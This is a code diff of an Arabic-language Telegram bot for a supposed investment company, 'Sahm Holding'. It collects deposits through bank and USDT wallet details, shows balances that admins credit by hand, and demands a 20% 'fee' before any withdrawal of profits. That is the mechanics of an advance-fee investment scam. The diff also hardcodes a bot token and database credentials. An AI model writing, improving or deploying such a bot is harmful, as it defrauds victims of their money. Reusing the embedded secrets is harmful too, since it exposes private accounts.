@@ -5,13 +5,13 @@ from pymongo import MongoClient
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# --- ⚙️ 1. الإعدادات ---
-logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
+# --- ⚙️ الإعدادات ---
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 flask_app = Flask('')
 @flask_app.route('/')
-def home(): return "💎 Dragon System: Final Edition Online"
+def home(): return "💎 Sahm Holding System: Stable"
 
 def run_flask():
     flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
@@ -19,20 +19,19 @@ def run_flask():
 def keep_alive():
     t = Thread(target=run_flask); t.daemon = True; t.start()
 
-# --- 🔑 2. البيانات الأساسية ---
+# --- 🔑 البيانات ---
 TOKEN = '8731999916:AAHDjo1noyGIbUH699aTjNns9kCjP8P9SHc'
 ADMINS = [6016547718]
 SUPPORT = "https://t.me/HCICICVICIF9"
 
-# بيانات الدفع
 BANK_INFO = "🏦 **بيانات الحساب البنكي:**\n\nالراجحي: `123456789012345`\nالاسم: شركة سهم القابضة"
 USDT_INFO = "🔗 **عنوان محفظة USDT (TRC20):**\n\n`TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA`"
 
-# مبالغ الاستثمار (أهمية الترتيب)
+# مبالغ الاستثمار الكاملة
 SAR_V = ["1000", "2000", "5000", "10000", "20000", "50000"]
 USD_V = ["300", "500", "1000", "2000", "5000", "10000"]
 
-# قاعدة البيانات
+# الربط مع قاعدة البيانات
 u_s, p_s = urllib.parse.quote_plus('Abduh'), urllib.parse.quote_plus('A11223344@5566')
 MONGO_URI = f"mongodb+srv://{u_s}:{p_s}@cluster0.0a4wefx.mongodb.net/DragonFinal?retryWrites=true&w=majority"
 
@@ -51,7 +50,7 @@ def get_u(uid):
         return res if res else d
     except: return d
 
-# --- 🏠 3. الواجهات الرئيسية ---
+# --- 🏠 الواجهات ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     kb = [
@@ -60,30 +59,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📤 طلب سحب", callback_data='wd')],
         [InlineKeyboardButton("👨‍💻 الدعم الفني", url=SUPPORT)]
     ]
-    txt = f"👑 **مرحباً بك في شركة سهم القابضة**\n\nالمستثمر: **{user.first_name}**\n\n_اختر فئة الاستثمار المناسبة لبدء العمل:_ "
-    
-    if update.message:
-        await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
-    else:
-        await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+    txt = f"👑 **مرحباً بك في شركة سهم القابضة**\n\nالمستثمر: **{user.first_name}**\n\n_اختر فئة الاستثمار المناسبة للبدء:_ "
+    if update.message: await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+    else: await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
 
 async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query; uid = q.from_user.id; data = q.data
-    await q.answer() # فك تعليق الزر فوراً
+    await q.answer()
     u = get_u(uid)
 
     if data == 'main': await start(update, context)
-    
     elif data == 'w':
-        txt = f"🏦 **رصيدك الحالي بالمحفظة:**\n\n🇸🇦 `{u.get('sar',0.0):,}` ﷼\n🇺🇸 `{u.get('usd',0.0):,}` $"
+        txt = f"🏦 **رصيدك الحالي:**\n\n🇸🇦 `{u.get('sar',0.0):,}` ﷼\n🇺🇸 `{u.get('usd',0.0):,}` $"
         await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
-
     elif data == 'tr':
-        await q.edit_message_text(f"📈 **عدد الصفقات النشطة:** `{u.get('t',0)}` \nالحالة: 🟢 نشط", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]))
-
+        await q.edit_message_text(f"📈 **الصفقات النشطة:** `{u.get('t',0)}` \nالحالة: 🟢 تعمل", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]))
     elif data == 'wd':
-        r_sar, r_usd = float(u.get('sar', 0)) * 0.20, float(u.get('usd', 0)) * 0.20
-        txt = (f"📤 **طلب سحب الأرباح:**\n\n💰 رصيدك: `{u.get('sar',0)}` ﷼ / `{u.get('usd',0)}` $\n\n"
+        r_sar, r_usd = float(u.get('sar',0))*0.2, float(u.get('usd',0))*0.2
+        txt = (f"📤 **طلب سحب الأرباح:**\n\n💰 رصيدك المتاح: `{u.get('sar',0)}` ﷼ / `{u.get('usd',0)}` $\n\n"
                f"⚠️ **رسوم السحب المستحقة (20%):**\nيتوجب عليك دفع مبلغ: `{r_sar:,.1f}` ﷼ أو `{r_usd:,.1f}` $\n\n"
                f"**يرجى دفع الرسوم المتوجبه عليك لفتح بوابة تحويل الارباح.**")
         await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
@@ -98,20 +91,21 @@ async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data.startswith('s_'):
         _, curr, amt = data.split('_')
         info = BANK_INFO if curr == 'sr' else USDT_INFO
-        await q.edit_message_text(f"✨ **إيداع مبلغ {amt}:**\n\n{info}\n\n📸 **أرسل صورة الإيصال الآن ليتم التفعيل.**", parse_mode='Markdown')
+        await q.edit_message_text(f"✨ **إيداع بمبلغ {amt}:**\n\n{info}\n\n📸 **أرسل صورة الإيصال الآن ليتم التحقق وتفعيل حسابك.**", parse_mode='Markdown')
 
-    # --- 🛠️ معالج أزرار المالك (مختصر جداً للاستجابة) ---
+    # --- 🛠️ نظام الاعتماد (Admin Logic) ---
     elif data.startswith(('v_', 'x_')):
         if uid not in ADMINS: return
-        action = data.split('_') # v=اعتماد, x=رفض
-        res_type, amt, target_id = action[1], action[2], action[3]
+        p = data.split('_') # v_العملة_المبلغ_المعرف
+        act, cur, amt, tid = p[0], p[1], p[2], p[3]
         
-        if action[0] == 'v':
-            key = "sar" if res_type == "sr" else "usd"
+        if act == 'v':
+            key = "sar" if cur == "sr" else "usd"
             if users_col:
-                users_col.update_one({"uid": int(target_id)}, {"$inc": {key: float(amt), "t": 1}}, upsert=True)
-            await q.edit_message_caption("✅ تم شحن الحساب بنجاح!")
-            try: await context.bot.send_message(target_id, f"🎊 مبروك! تم شحن `{amt}` {'﷼' if key=='sar' else '$'} في محفظتك.")
+                # تحديث قاعدة البيانات فوراً
+                users_col.update_one({"uid": int(tid)}, {"$inc": {key: float(amt), "t": 1}}, upsert=True)
+            await q.edit_message_caption(f"✅ تم اعتماد شحن {amt} بنجاح!")
+            try: await context.bot.send_message(tid, f"🎊 مبروك! تم شحن `{amt}` {'﷼' if key=='sar' else '$'} في محفظتك بنجاح.")
             except: pass
         else:
             await q.edit_message_caption("❌ تم رفض الإيصال.")
@@ -119,12 +113,18 @@ async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def photo_h(update: Update, context: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     await update.message.reply_text("⏳ تم استلام إيصالك.. جاري المراجعة.")
-    # أزرار المالك مختصرة جداً (v_ للقبول و x_ للرفض) لضمان الاستجابة
-    kb = [[InlineKeyboardButton(f"﷼ {p}", callback_data=f"v_sr_{p}_{u.id}") for p in ["1000", "5000", "10000"]]]
-    kb += [[InlineKeyboardButton(f"$ {p}", callback_data=f"v_us_{p}_{u.id}") for p in ["300", "1000", "5000"]]]
-    kb.append([InlineKeyboardButton("🚫 رفض الإيصال", callback_data=f"x_0_0_{u.id}")])
+    # أزرار الإدارة (تم تقصير الكود لضمان الاستجابة وضمان وصول الرصيد)
+    def mk_btn(cur, vals):
+        return [InlineKeyboardButton(f"{'﷼' if cur=='sr' else '$'} {v}", callback_data=f"v_{cur}_{v}_{u.id}") for v in vals]
+    
+    kb = [mk_btn('sr', ["1000", "5000", "10000"]), mk_btn('sr', ["20000", "50000"]),
+          mk_btn('us', ["300", "1000", "5000"]), mk_btn('us', ["10000"]),
+          [InlineKeyboardButton("🚫 رفض الإيصال", callback_data=f"x_0_0_{u.id}")]]
+    
     for adm in ADMINS:
-        await context.bot.send_photo(adm, update.message.photo[-1].file_id, caption=f"🔔 إيداع من: {u.first_name}\nID: `{u.id}`", reply_markup=InlineKeyboardMarkup(kb))
+        await context.bot.send_photo(adm, update.message.photo[-1].file_id, 
+                                   caption=f"🔔 إيداع من: {u.first_name}\nID: `{u.id}`", 
+                                   reply_markup=InlineKeyboardMarkup(kb))
 
 if __name__ == '__main__':
     keep_alive()
